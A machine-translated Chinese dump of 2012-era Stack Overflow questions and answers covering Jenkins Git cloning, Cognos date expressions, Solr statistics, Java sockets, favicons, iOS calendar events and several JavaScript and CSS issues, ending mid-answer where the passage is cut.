我目前正在运行 Lion (10.7.4) 的 mac mini 服务器上设置 Jenkins，并且在 git/github 集成方面遇到了一些问题。

为了解决我遇到的问题，我设置了一个只有非常基础的测试作业，在这种情况下，只是 git 存储库。该作业应该简单地克隆远程仓库。
这是目前正在发生的事情：

```
Started by user anonymous
Building in workspace /Users/Shared/Jenkins/Home/workspace/fr-develop-latest
Checkout:fr-develop-latest / /Users/Shared/Jenkins/Home/workspace/fr-develop-latest - hudson.remoting.LocalChannel@1eaaf438
Using strategy: Default
Cloning the remote Git repository
Cloning repository origin 
```

...它只是在那里挂了很长时间（最终它超时）。

我显然为此搜索了这个，发现有几个人有同样的问题，但没有解决方案。

为了进一步解决问题，我尝试了一些方法：

. 我添加了一个“Execute Shell”构建步骤，只运行一个简单的`export`命令。这是它的输出：

```
Started by user anonymous
Building in workspace /Users/Shared/Jenkins/Home/workspace/test
[test] $ /bin/sh -xe /var/folders/05/tx3h6q9d0fd357pwxqswnqb400007v/T/hudson3541244199270773922.sh
+ export
export BUILD_ID="2012-10-10_14-13-21"
export BUILD_NUMBER="16"
export BUILD_TAG="jenkins-test-16"
export BUILD_URL="http://ctx.local:8080/job/test/16/"
export EXECUTOR_NUMBER="0"
export HOME="/Users/Shared/Jenkins"
export HUDSON_COOKIE="19f08f0b-059d-40b9-9672-ead63c741910"
export HUDSON_HOME="/Users/Shared/Jenkins/Home"
export HUDSON_SERVER_COOKIE="82054d3c12fc596dd66eabce21a6bf3e"
export HUDSON_URL="http://ctx.local:8080/"
export JAVA_ARCH="x86_64"
export JAVA_MAIN_CLASS_63290="Main"
export JENKINS_HOME="/Users/Shared/Jenkins/Home"
export JENKINS_SERVER_COOKIE="82054d3c12fc596dd66eabce21a6bf3e"
export JENKINS_URL="http://ctx.local:8080/"
export JOB_NAME="test"
export JOB_URL="http://ctx.local:8080/job/test/"
export LOGNAME="jenkins"
export NODE_LABELS="master"
export NODE_NAME="master"
export OLDPWD
export PATH="/usr/bin:/bin:/usr/sbin:/sbin"
export PWD="/Users/Shared/Jenkins/Home/workspace/test"
export SECURITYSESSIONID="186ae"
export SHELL="/bin/bash"
export SHLVL="1"
export TMPDIR="/var/folders/05/tx3h6q9d0fd357pwxqswnqb400007v/T/"
export USER="jenkins"
export WORKSPACE="/Users/Shared/Jenkins/Home/workspace/test"
export __CF_USER_TEXT_ENCODING="0xFB:0:0"
export com.apple.java.jvmMode="client"
export com.apple.java.jvmTask="CommandLine.java"
Finished: SUCCESS 
```

. 在执行原始测试作业时，我`ps -ef | grep git`在 shell 上运行并得到了这个：

```
251 64578 63290   0  2:05pm ??         0:00.22 /usr/bin/git clone --progress -o origin git@github.com:MyProjectRedacted/FR-Dev.git /Users/Shared/Jenkins/Home/workspace/fr-develop-latest
251 64579 64578   0  2:05pm ??         0:03.98 ssh git@github.com git-upload-pack 'EFEdcuationFirstMobile/FR-Dev.git'
251 64582 64578   0  2:05pm ??         0:03.36 git index-pack --stdin -v --fix-thin --keep=fetch-pack 64578 on ctx.ci.local 
```

在 shell 上，以 user 身份运行`jenkins`，执行相同的命令`/usr/bin/git clone --progress -o origin git@github.com:MyProjectRedacted/FR-Dev.git /Users/Shared/Jenkins/Home/workspace/fr-develop-latest`就可以了。存储库被克隆。

我终于尝试使用相同的命令添加一个新的“执行 Shell”构建步骤。它也有效。

所以...肯定是 git 插件搞砸了。
我有`jenkins`正确设置用户的 SSH 密钥，我可以使用 ssh git@github.com 连接到远程 git repo

在这一点上，我有点卡住了。
关于如何解决这个问题的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-22T14:25:45.817

我看到了类似的症状，我发现它是由 Jenkins 的 Git 插件 clone() 方法中的工作区递归删除引起的（参见下面的代码片段）。就我而言，我们有许多共享单个自定义工作区的作业，因此删除调用需要数小时才能完成。删除自定义工作区后，克隆操作成功完成。

从[https://github.com/jenkinsci/git-plugin/blob/master/src/main/java/hudson/plugins/git/GitAPI.java](https://github.com/jenkinsci/git-plugin/blob/master/src/main/java/hudson/plugins/git/GitAPI.java)：

```
final String source = remoteConfig.getURIs().get(0).toPrivateString();

listener.getLogger().println("Cloning repository " + source);
final int[] gitVer = getGitVersion();

try {
    workspace.deleteRecursive();  // This line was taking forever
} catch (Exception e) {
    e.printStackTrace(listener.error("Failed to clean the workspace"));
    throw new GitException("Failed to delete workspace", e);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T09:14:10.027

好吧，问题解决了，结果一开始就没有问题。

发生了两件事，给人的印象`git clone`是悬而未决：

1.  进度未更新
2.  昨天连接非常慢

我实际上忘记了停止工作，当我今天回来时，一切都很好。
干杯。

# cognos - Cognos 8 中的日期算术

> ID：12820481
> 
> 赞同：0
> 
> 时间：2012-10-10T13:26:30.447
> 
> 标签：cognos, cognos-8

我需要的是一个数据项表达式，它输出去年当前季度的开始日期。查找当前年份很容易，从该日期减去 1 年也是如此。但除此之外，我被卡住了。

我目前`if`对每个季度都有一个丑陋的表达，例如：

> if (extract(month,current_date) in (10,12,12)) then ((extract(year,_add_years (current_date,-1))||'-10-01'))

但无论我做什么，我都无法将年份和日期连接成字符串，我可以将其转换为日期对象。上面的代码给出了错误：

> “加法”操作对以下数据类型组合无效：“整数”和“字符”

尝试使用`cast()`我将整数转换为字符时出现此错误。尝试将字符数组转换为日期时，我也会收到此错误：

> “condexp”操作对以下数据类型组合无效：“字符”和“整数”

尝试使用 SQL Server 特定函数（它是一个 SQL Server 数据库）只会给我一个错误，即这些函数不可用于本地处理，所以我似乎无法使用 SS 日期算术，而且我找不到任何特别适用的东西在 Cognos 的内置日期函数中。

如何操作日期以将年份添加到已知的日/月组合并将其用作日期对象？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T09:44:36.173

我正在使用 cognos 10.1.1，但它会工作。

您可以使用以下代码获取该值：

```
_make_timestamp(
  extract(year, _add_years(current_date, -1)),
  (floor((extract(month,current_date)-1)/3)*3+1),
  01
) 
```

以下是获取季度开始月份的简单方法。

```
(floor((extract(month,current_date)-1)/3)*3+1), 
```

您可以将时间戳转换为日期或字符串。

```
cast(
  _make_timestamp(
  extract(year, _add_years(current_date, -1)),
  (floor((extract(month,current_date)-1)/3)*3+1),
  01
  ),
  date
) 
```

,

```
cast(
  cast(
    _make_timestamp(
      extract(year, _add_years(current_date, -1)),
      (floor((extract(month,current_date)-1)/3)*3+1),
      01
    ),
    date),
    varchar(10)
) 
```

另外，当您获得一天的价值时，您可以使用提取功能。

```
extract(day, _first_of_month (current_date)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T09:18:43.697

I would go with SQLSERVER built-in functions tht exists in Cognos.
Here is an expression that works for me:

```
DATEADD({month},(3)*((DATEPART({quarter},[FullDateAlternateKey]))-1),
DATEADD({YEAR}, DATEDIFF({YEAR}, 0, dateadd({year},-1,[FullDateAlternateKey])), 0)) 
```

The FullDateAlternateKey field is my date field (from ADVERTUREWORKS DW DB).
If you still have problems, try to isolate the problem by trying this expression on new simple list report.

# apache - Apache Solr Statscomponent 计算和返回的限制值

> ID：12820482
> 
> 赞同：2
> 
> 时间：2012-10-10T13:26:31.617
> 
> 标签：apache, solr, statistics

有没有办法将 solr statscomponent [http://bit.ly/T4PLnl](http://bit.ly/T4PLnl)配置为不包括“昂贵的” sumOfSquares 和 stddev ？

我们只需要 sum、min、max、mean、count 和 missing。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-09T22:31:27.593

使用[AnalyticsComponent](http://www.slideshare.net/SHIEngineers/whats-new-in-apache-solr-47-und-elasticsearch-11)，它支持以下内容：

*   StatsComponent 的所有功能 ( [SOLR-4499](https://issues.apache.org/jira/browse/SOLR-4499) )
*   场分面 ( [SOLR-3435](https://issues.apache.org/jira/browse/SOLR-3435) )
*   支持限制
*   排序（存储桶名称或存储桶中的任何统计信息
*   支持偏移
*   范围分面
*   支持标准范围刻面的所有选项
*   查询分面 ( [SOLR-2925](https://issues.apache.org/jira/browse/SOLR-2925) )
*   能够使用整体/字段方面统计信息作为范围/查询方面的输入（即计算最小/最大日期，然后在该范围内进行方面）
*   支持更复杂的聚合/映射操作 ( [SOLR-1622](https://issues.apache.org/jira/browse/SOLR-1622) )
*   聚合：最小值、最大值、总和、平方和、计数、缺失、标准差、平均值、中位数、百分位数
*   运算：否定、绝对值、加法、乘法、除法、幂、对数、日期数学、字符串反转、字符串连接

用法：

```
打开它
参数 默认 说明
olap=[true/false] 启用增强的分析功能

```

**参考**

*   [SOLR-5302：分析组件](https://issues.apache.org/jira/browse/SOLR-5302)

*   [搜索分析组件指南 (pdf)](https://issues.apache.org/jira/secure/attachment/12606793/Search%20Analytics%20Component.pdf)

*   [Solr 来源：AnalyticsParams.java](https://svn.apache.org/repos/asf/lucene/dev/trunk/solr/contrib/analytics/src/java/org/apache/solr/analytics/util/AnalyticsParams.java)

*   [Apache Lucene 和 Solr 4 的下一代搜索和分析](http://www.ibm.com/developerworks/library/j-solr-lucene/)

*   [SolrConfig 中的 RequestHandlers 和 SearchComponents](https://cwiki.apache.org/confluence/display/solr/RequestHandlers+and+SearchComponents+in+SolrConfig)

*   [搜索分析组件：由 Bloomberg LP 的 Steven Bower 介绍](http://www.slideshare.net/lucidworks/search-analytics-component-presented-by-steven-bower-bloomberg-lp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-06T16:48:21.543

这是我曾经尝试过的东西。我所关心的只是求和、计数和缺失，而分析仍然表明统计数据计算起来非常便宜，而且是免费的。考虑 sumOfSquares 需要 O(1) 空间和 O(n) 时间，与 sum、min、max、mean、count 和 missing 相同。无论您是否计算 sumOfSquares，StatsComponent 仍然必须遍历结果集并获取每个文档的字段值。ParseDouble 绝对是非分面统计数据的热点，至少如果您使用的是字符串字段！

# eclipse - 从 Eclipse 控制台运行 java 程序

> ID：12820489
> 
> 赞同：1
> 
> 时间：2012-10-10T13:26:43.300
> 
> 标签：eclipse, button, console

我在 Eclipse Indigo 中用 JAVA 编写了代码。我想从 Eclipse 内部的控制台运行该程序（即不使用 RUN 按钮）。因为我想要传递始终变化的参数，并且从“运行配置”设置参数非常乏味。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:03:31.577

在运行配置中添加 string_prompt 作为程序参数。

${string_prompt} 如果你特别想要文件\文件夹，还有一个 file_prompt 和一个 folder_prompt。

这些可通过“运行配置”对话框的 (x)= 参数选项卡上的“变量”按钮获得。

参考：[如何让 Eclipse 提示我输入命令行参数](https://stackoverflow.com/questions/313270)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:33:17.583

您可以创建一个配置文件，将其作为“运行配置”中的唯一变量，然后进行相应的解析。或者您可以在每次运行程序时提示用户输入配置。您可能需要重新考虑如何开发此代码以适应此类变化。

# javascript - 为什么我的代码在 IE7 中不受支持？

> ID：12820491
> 
> 赞同：-5
> 
> 时间：2012-10-10T13:26:51.650
> 
> 标签：javascript, internet-explorer-7

```
var searchKey = "";
for (var i = 0; i < 16; i++) {
    searchKey += Math.floor(Math.random() * 0xF).toString(0xF) + (i == 4 || i == 6 || i == 8 || i == 10 ? "|" : "");
}
searchKey = searchKey + "_";
document.getElementById('searchKey1').value = searchKey; 
```

我的代码在 IE8 中运行良好，但不支持 IE7 它显示“'document.getElementById(...) is null or not an object”为什么？请给出解决方案

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:30:21.437

显然 IE7 打破了 getElementById：[IE7 打破了 getElementById](http://remysharp.com/2007/02/10/ie-7-breaks-getelementbyid/)

从那个链接：

> IE 将表单上的 name 属性视为 ID 属性，

# firefox - Favicon 未在 Firefox 或 Chrome 中显示

> ID：12820492
> 
> 赞同：1
> 
> 时间：2012-10-10T13:26:57.140
> 
> 标签：firefox, google-chrome, favicon

我已将 favicon.ico 上传到服务器上客户端的根 (htdocs) 目录，并在`</head>`标记前添加了以下内容：

```
<link type="image/x-icon" rel="icon" href="/favicon.ico"/>
<link type="image/x-icon" rel="shortcut icon" href="/favicon.ico"/> 
```

它可以在除 Firefox 和 Chrome 之外的所有浏览器中正常加载。在这两个中，虽然图标在选项卡中加载，但它不会在网址栏中加载。在 Firefox 中，我看到一个地球图标，在 Chrome 中，我看到一个文档图标。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:34:09.613

这在 Chrome 和 FF 中不是很正常吗？我在 chrome 的任何一侧都看不到地址栏中的图标。那里显示在选项卡中。文档图标用于显示有关页面的详细信息。如果您在地址栏中找到显示网站图标的页面，您可以查看页面源以了解他们是如何做到的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-24T12:59:37.933

据我所知，Firefox 中不再显示任何网站图标，因为某些网站使用“锁定”符号作为网站图标来模拟安全连接（安全连接徽标将出现在 URL 左侧的网站图标旁边）。不过，网站图标仍将显示在选项卡和书签中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:43:56.260

您的代码很好（除非 favicon 没有这样的文件）。您只需要清除浏览器的缓存或使用清除缓存重新加载页面 (Ctrl+F5)。但是，您应该知道 FF/Chrome 需要一段时间才能识别新的网站图标，因此您可以在尚未访问过您网站的其他计算机/浏览器中测试它们。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-09T03:24:36.233

我不是真正的程序员，我也遇到过类似的问题，这是最终对我有用的简单事情......

我管理着几个简单的网站，但 Firefox 拒绝加载一个特定网站的网站图标。我上网查了一下，我能理解的都试过了。没有任何效果。该代码与其他图标运行良好的网站完全相同（实际上是复制的）。

最终我突然意识到，也许 Firefox 不喜欢我过去的路径。该站点是托管在我自己的域上的转发 URL。（即个人域是 myplace.ca 并且不会加载的网站图标是注册 URL something.com 的一部分，它实际上位于 myplace.ca/PutItHere/）如果我使用注册的 URL (something.com) 没有网站图标。如果我在浏览器中使用真实路径，突然出现favicon！我所要做的就是为绝对路径而不是注册域添加书签！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-10-01T09:06:20.153

```
...href="favicon.ico"/>" 
```

请注意`"favicon.ico"`上面的行，如果它位于根文件夹中，请避免使用前置的正斜杠。它适用于 Firefox 24.0

# objective-c - CCAnimate 只是第一次滞后

> ID：12820498
> 
> 赞同：0
> 
> 时间：2012-10-10T13:27:15.510
> 
> 标签：objective-c, cocos2d-iphone, texturepacker

在“按下”按钮上，我执行如下动画：

```
//create sprite
animatedSprite = [[CCSprite alloc] initWithFile:@"transparentPixel.png" rect:CGRectMake(0, 0, 218, 218)];
SET_POS(animatedSprite, 167, 51);
[self addChild:animatedSprite z:5000];
//animate sprite            
[animatedSprite runAction:[CCAnimate actionWithAnimation:[[CCAnimationCache sharedAnimationCache] animationByName:@"skill1use"]]];
//run cleanup fnktion
[animatedSprite performSelector:@selector(removeFromParentAndCleanup:) withObject:[NSNumber numberWithBool:YES] afterDelay:3];            
[animatedSprite release]; 
```

以前我加载了框架：

```
[[CCSpriteFrameCache sharedSpriteFrameCache] addSpriteFramesWithFile:[CCDirector sharedDirector].contentScaleFactor>1?@"skill_01_ani@2x.plist":@"skill_01_ani.plist"];
[[CCAnimationCache sharedAnimationCache] addAnimation:[CCAnimation animationWithSpriteSequence:[CCDirector sharedDirector].contentScaleFactor>1?@"skill_01_ani%04d@2x.png":@"skill_01_ani%04d.png" numFrames:34 delay:1/24.0] name:@"skill1use"]; 
```

然而，动画在第一次之后运行得更加流畅，第一次需要一段时间才能开始。我预加载动画错误吗？有没有办法让动画第一次流畅运行？

**更新**

如果我在预览中设置以下内容，它第一次运行速度很快：

```
CCSprite *animatedSprite = [[CCSprite alloc] initWithFile:@"transparentPixel.png" rect:CGRectMake(0, 0, 218, 218)];
[self addChild:animatedSprite z:5000];
[animatedSprite runAction:[CCAnimate actionWithAnimation:[[CCAnimationCache sharedAnimationCache] animationByName:@"skill1use"]]];
[animatedSprite performSelector:@selector(removeFromParentAndCleanup:) withObject:[NSNumber numberWithBool:YES] afterDelay:3];
[animatedSprite release]; 
```

因为它与运行动画相同。但是，这仅在我实际显示动画时才有效（使用 addChild 和所有内容）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:35:42.647

据我所知，这个动作第一次创建 CCAnimation 对象并将其存储在 CCAnimationCache 中。尝试预先缓存您的动画或在您的 init 方法中对其进行初始化，然后将其存储。在您的按钮上单击只是重新创建动作，而不是动画。

# ios - iOS 上带有 eventWithIdentifier 的 EKEvent

> ID：12820501
> 
> 赞同：6
> 
> 时间：2012-10-10T13:27:17.973
> 
> 标签：ios, events, calendar, add, ekevent

如果我想`EKEvent`从`EKEventStore`with`eventWithIdentifier`方法中检索以前保存的事件，但我总是得到空值。

这是添加事件的代码：

```
EKEventStore *eventStore = [[EKEventStore alloc] init];
EKEvent *newEvent = [EKEvent eventWithEventStore:eventStore];
newEvent.title = @"Test";
newEvent.availability = EKEventAvailabilityFree;
newEvent.startDate = startDate;
newEvent.endDate = endDate;
[newEvent addAlarm:[EKAlarm alarmWithRelativeOffset:-15*60]];

newEvent.calendar = [eventStore defaultCalendarForNewEvents];

NSError *err;
BOOL success = [eventStore saveEvent:newEvent span:EKSpanThisEvent commit:YES error:&err];

if (success) {
    if ([newEvent respondsToSelector:@selector(calendarItemIdentifier)]) {
        [[NSUserDefaults standardUserDefaults] setObject:newEvent.calendarItemIdentifier forKey:self.showId];
        NSLog(@"Event ID: %@",newEvent.calendarItemIdentifier);
    }
    else {
        [[NSUserDefaults standardUserDefaults] setObject:newEvent.UUID forKey:self.showId];
        NSLog(@"Event ID: %@",newEvent.UUID);
    }
} 
```

以及删除事件的代码：

```
EKEventStore *eventStore = [[EKEventStore alloc] init];

NSError *err;
BOOL success = YES;

NSLog(@"Event ID: %@",[[NSUserDefaults standardUserDefaults] objectForKey:self.showId]);

EKEvent *existingEvent = [eventStore eventWithIdentifier:[[NSUserDefaults standardUserDefaults] objectForKey:self.showId]];
NSLog(@"Existing event: %@",existingEvent);
if (existingEvent != nil) {
    success = [eventStore removeEvent:existingEvent span:EKSpanThisEvent error:&err];
}
if (success) {
    [[NSUserDefaults standardUserDefaults] removeObjectForKey:self.showId];
} 
```

为什么我无法从具有相同事件 ID 的日历中删除之前添加的事件？

*此代码已在 iOS 5（iPad 1）和 iOS 6（新 iPad）上测试...*

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-17T20:28:11.380

我正在使用`newEvent.eventIdentifier`而不是`newEvent.calendarItemIdentifier`到目前为止，使用`[store eventWithIdentifier:_project.event_identifier]`，我可以检索、删除和编辑现有事件。你应该试试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:03:07.433

文档警告说：“如果事件的日历发生变化，它的标识符很可能也会发生变化。” 在您存储 eventIdentifer 和尝试删除它之间，该事件是否有任何变化？

# java - 哪些 API 或库支持在 Java Web 应用程序中显示 xls/xlsx？

> ID：12820502
> 
> 赞同：0
> 
> 时间：2012-10-10T13:27:21.553
> 
> 标签：java, jsf

我想在我的 Web 应用程序中显示 xls/xlsx 文档。它使用的是JSF2.0。用户在预定会议室时可以上传带有 xls/xlsx 文件的会议议程。我想提供一个功能，在与会者加入会议室时显示文档。我不知道哪个 API 支持 java web。Apache POI 可以用来显示在网页中吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T15:15:10.420

Apache POI 是一个可用于创建、读取和操作 XLS(X) 文件的库。

因此，这显然只有在您想要创建、读取和/或操作 XLS(X) 文件时才有用。在您的特定情况下，使用它来读取 XLS(X) 文件是有意义的，这样您就可以在一些 Javabeans 集合中收集所需的信息，然后使用 JSF`<h:dataTable>`或`<ui:repeat>`.

`<iframe>`一个完全不同的替代方法是在生成的 HTML 页面中或在生成的 HTML 页面中显示 XLS(X) 文件纯原版`<object>`，但这只有在 web 浏览器识别文件类型时才有效（通常只有在客户端计算机上安装了 MS Office 时才会出现这种情况) 并支持 XLS(X) 文件的内联显示（这通常只在 MSIE 浏览器中出现，而在其他浏览器中则不然）。因此，这对客户端提出了巨大的限制：客户端需要安装有 MS Office 并使用 MSIE 浏览器的 Windows 机器。使用 Apache POI 从 XLS(X) 文件中提取信息并使用 JSF 在 HTML 中呈现它确实是最好的方法。

# java - 简单的服务器/客户端套接字连接？

> ID：12820503
> 
> 赞同：1
> 
> 时间：2012-10-10T13:27:24.830
> 
> 标签：java, eclipse, sockets, tcp, client

我正在编写一个 java 套接字，服务器在其中运行，客户端连接到服务器，服务器可以从客户端命令行读取。

首先我想连接到服务器，这里是代码：

```
public class Server{
    public static void main(String[] args) throws IOException {

        ServerSocket serverSocket = null;

        try {
            serverSocket = new ServerSocket(10000);
        } catch (IOException e) {
            System.err.println("Could not listen on port: 4444.");
            e.printStackTrace();
            System.exit(1);
        }

        Socket clientSocket = null;
        try {
            clientSocket = serverSocket.accept();
        } catch (IOException e) {
            System.err.println("Accept failed.");
            System.exit(1);
        }

        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        String inputLine, outputLine;

        out.close();
        in.close();
        clientSocket.close();
        serverSocket.close();
    }

} 
```

这是我的客户：

```
public class Client {
    public static void main(String[] args) throws IOException {

        Socket socket = null;
        PrintWriter out = null;
        BufferedReader in = null;

        try {
            socket = new Socket("taranis", 4444);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host: taranis.");
            System.exit(1);
        } catch (IOException e) {
            System.err.println("Couldn't get I/O for the connection to: taranis.");
            System.exit(1);
        }

        BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
        String fromServer;
        String fromUser;

        while ((fromServer = in.readLine()) != null) {
            System.out.println("Server: " + fromServer);
            if (fromServer.equals("Bye."))
                break;

            fromUser = stdIn.readLine();
            if (fromUser != null) {
                System.out.println("Client: " + fromUser);
                out.println(fromUser);
            }
        }

        out.close();
        in.close();
        stdIn.close();
        socket.close();
    }
} 
```

当我启动服务器时，我得到“无法侦听端口：4444”。

为什么？

**更新：**

现在我无法再次重新启动服务器，因为我得到了

```
java.net.BindException: Address already in use: JVM_Bind
    at java.net.DualStackPlainSocketImpl.bind0(Native Method)
    at java.net.DualStackPlainSocketImpl.socketBind(Unknown Source)
    at java.net.AbstractPlainSocketImpl.bind(Unknown Source)
    at java.net.PlainSocketImpl.bind(Unknown Source)
    at java.net.ServerSocket.bind(Unknown Source)
    at java.net.ServerSocket.<init>(Unknown Source)
    at java.net.ServerSocket.<init>(Unknown Source) 
```

我该怎么办？（我使用的是windows7）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-10T16:49:40.340

在我看来，您的服务器没有侦听端口 4444，而是侦听端口 10000，但是您的客户端尝试连接到端口 4444。

如果您关闭应用程序，要回答您的第二个问题，请确保您实际终止它。有时，如果您再次启动应用程序，您有 2 个正在运行，并且很难看到其中 1 个应用程序仍处于打开状态。

希望我对您有所帮助，请在评论中回复，稍后再回来查看您：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-28T12:06:54.767

如果您使用的是 Eclipse，只需按控制台磁贴上的红色方块即可停止它，然后您可以重新连接

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-04T23:27:08.860

java.net.BindException：地址已在使用中：JVM_Bind

通常在您没有像在 eclipse 中那样正确终止最后一次执行时出现，如果您运行然后再次运行而不终止，您需要在控制台中“终止”进程。

仅表示“端口”已被使用（几乎来自您启动的同一类）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-08-17T08:03:30.587

**例外**： `java.net.BindException: Address already in use: JVM_Bind`

解决方案是从服务器选项卡中删除项目，然后右键单击并在服务器上运行项目。这将项目添加回 Tomcat 7 并且我没有收到 BindException 错误。这是由于您上次使用时关闭了 eclipse 而没有停止 Tomcat 服务器。

# java - 如何通过命令提示符手动列出包中存在的类？

> ID：12820507
> 
> 赞同：0
> 
> 时间：2012-10-10T13:27:29.830
> 
> 标签：java

什么是用于列出包中存在的所有类的 Windows 命令提示符命令。

我知道要列出方法，例如 javap java.lang.String

我有什么要问的吗？

附加细节：我的问题是预定义的类，请务必提供包装在 jar 中的用户定义的类......！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:31:11.917

如果您的类未打包到 jar 文件中，请使用`ls`or`dir`命令（取决于您的操作系统）。如果类在 jar 中，请使用命令`jar -vft yourjar.jar`and 或者`grep`or `find`，例如

`jar -vft myjar.jar | grep 'com/mycompany/myproject'`适用于 Unix `jar -vft myjar.jar | find "com/mycompany/myproject"`适用于 Windows

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:33:05.250

利用

```
jar -tvf filename.jar 
```

其中 filename.jar 是您的文件

# html - 如何根据 iframe 高度内的表格调整表格 td 的高度

> ID：12820512
> 
> 赞同：0
> 
> 时间：2012-10-10T13:27:50.877
> 
> 标签：html, css

我的 HTML：

```
<table>
  <tr>
    <td id="mainform">
      <iframe id="ifSur"></iframe>
    </td>
    <td id="subform"></td>
  </tr>
</table> 
```

在 iframe 中，`1.aspx`页面将被加载。所以`subform` `t`d 的高度必须是`<form>`标签 in的高度`1.aspx`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:50:47.630

1.aspx的load事件中，调用父框架上的一个函数，传递窗体高度。

```
window.parent.adjustTD(document.myForm.offsetHeight); 
```

（我假设表单的名称是“myForm”；如果不是，请相应地调整代码。）在父级上：

```
function adjustTD(inHeight)
{
   document.getElementById("subform").style.height = inHeight.toString() + "px";
} 
```

未经测试的代码，可能需要调试等等。您确定要调整它的“子窗体”，而不是“主窗体”吗？

# javascript - 以随机顺序加载的 Javascript 无法初始化

> ID：12820514
> 
> 赞同：0
> 
> 时间：2012-10-10T13:27:54.013
> 
> 标签：javascript, ecmascript-5

我以未确定的顺序加载了我的 javascript。我有一个命名空间函数来注册命名空间。例如，可以这样写：

```
"com.stackoverflow.question".namespace(new function() {
    this.sayHelloTo = function(text) { alert("Hello" + text); }
}); 
```

不幸的`namespace.js`是，并不总是首先加载，因为加载顺序是随机的，但其他脚本使用命名空间函数。有没有办法在不出现错误“ `.namespace`”不是函数的情况下实现这一点？

所以`sayHelloTo`以后一定有办法初始化定义，我有一个 Everything is loaded 事件。所以即将发表的声明有效，但我认为它非常难看。

```
var postInit = postInit || [];
postInit.push(function() {
  "com.foo.bar".namespace(new function() {
      this.sayHelloTo = function(text) { alert(text); }
  });
}); 
```

当事件发生时：

```
list.foreach(function(k, v) { v.call();  }); 
```

有没有更好的方法来实现这一目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:30:39.557

使用 AMD：查看[http://requirejs.org/](http://requirejs.org/)。或者 common.js 可能会根据使用情况起作用。

# javascript - 如何从 Javascript 中的 .xml 文件中获取 XML 值？

> ID：12820515
> 
> 赞同：0
> 
> 时间：2012-10-10T13:27:52.910
> 
> 标签：javascript, html, xml

我有一个名为“status.xml”的文件，其中包含以下内容：

```
<response>
<r1>~relay(1)~</r1>
<r2>~relay(2)~</r2>
<ct>~currentime~</ct>
<soc>~gaugeSOC~</soc>
<t1>25</t1>
</response> 
```

从与我的 status.xml 文件位于同一根目录的 .htm 页面中，我想获取 at 的值并将其解析为整数。我尝试了以下两种方法均未成功：

```
<script>
...
xmlDoc=loadXMLDoc("status.xml");
gaugeSOC.setValue(xmlDoc.getElementsByTagName('t1'));
</script> 
```

或者

```
<script>
...
var x = getXMLValue('status.xml', 't1');
gaugeSOC.setValue(x);
</script> 
```

其中 gaugeSOC.setValue(int) 接收一个整数。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:43:54.643

```
xmlDoc.getElementsByTagName('t1') 
```

此行返回节点对象列表，因此不能直接转换为整数值。您必须首先选择正确的子元素：

```
x = xmlDoc.getElementsByTagName('t1')
var i = x[0].childNodes[0].nodeValue; 
```

那应该可以完成工作，这里是一个示例，它大致显示了您要执行的操作：http: [//www.w3schools.com/dom/dom_nodes_nodelist.asp](http://www.w3schools.com/dom/dom_nodes_nodelist.asp)

# html - 如何在 CSS 中构建这个网格？

> ID：12820520
> 
> 赞同：0
> 
> 时间：2012-10-10T13:28:04.753
> 
> 标签：html, css

我有一个带网格的PSD，网站的宽度是：980px 每列的宽度是100px，间距是10px

我对使用网格很陌生，我尝试过使用网格生成器，但是，我找不到一个可以正常工作的网格生成器。

它必须是响应式的，以 % 而不是 px

我该如何设置？

请参阅此处的网格： ![在此处输入图像描述](../Images/811dc249ff6fdcce19eb1b90478094af.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:35:02.527

你说每列必须是 100px，但还必须是响应式的并使用 % 值？我很困惑。

你的意思是这样的吗？ [http://jsfiddle.net/wV9Ug/](http://jsfiddle.net/wV9Ug/)

# javascript - 显示滚动条时防止 DIV 调整大小

> ID：12820522
> 
> 赞同：3
> 
> 时间：2012-10-10T13:28:14.237
> 
> 标签：javascript, html

我有一个滚动 div，我在其中使用 CSS 显示/隐藏滚动条，具体取决于用户是否将鼠标悬停在 div 上。没有悬停=没有滚动条。

```
div.mouseScroll {
    overflow: hidden;
}

div.mouseScroll:hover {
    overflow-y: scroll;
} 
```

很简单，除了一个问题。当用户将鼠标悬停在 div 上时，它会显示滚动条，但这样做也会稍微调整 div 的内容大小以适应滚动条。有没有办法以某种方式将滚动条显示到侧面，或将其悬停在顶部？在添加滚动条时阻止 div 内的内容调整大小所需的一切。

我可以使用 javascript。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T14:18:00.207

